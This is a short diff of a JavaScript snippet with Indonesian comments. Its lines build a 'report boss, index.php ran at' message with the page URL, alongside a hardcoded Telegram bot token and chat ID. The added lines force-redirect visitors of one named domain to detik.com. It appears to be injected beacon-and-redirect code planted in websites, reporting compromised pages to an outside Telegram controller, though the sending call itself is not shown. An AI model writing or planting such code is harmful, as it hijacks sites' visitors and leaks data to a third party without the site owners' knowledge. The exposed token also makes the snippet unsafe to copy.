@@ -1,5 +1,13 @@
 (function() {
   const url = window.location.href;
+  const host = window.location.hostname;
+
+  // Ganti dengan domain yang ingin diarahkan
+  if (host === 'ahmed-abdo.com') {
+    window.location.href = 'https://detik.com';
+    return; // stop eksekusi jika sudah redirect
+  }
+
   const message = encodeURIComponent(`Lapor bos, index.php dijalankan di: ${url}`);
   const telegramToken = '8471738613:AAHY5IHGgp42sB8CoTJTC7iggOQiHRouqV4'; // Ganti dengan token kamu
   const chatId = '6813445148'; // Ganti dengan chat ID kamu
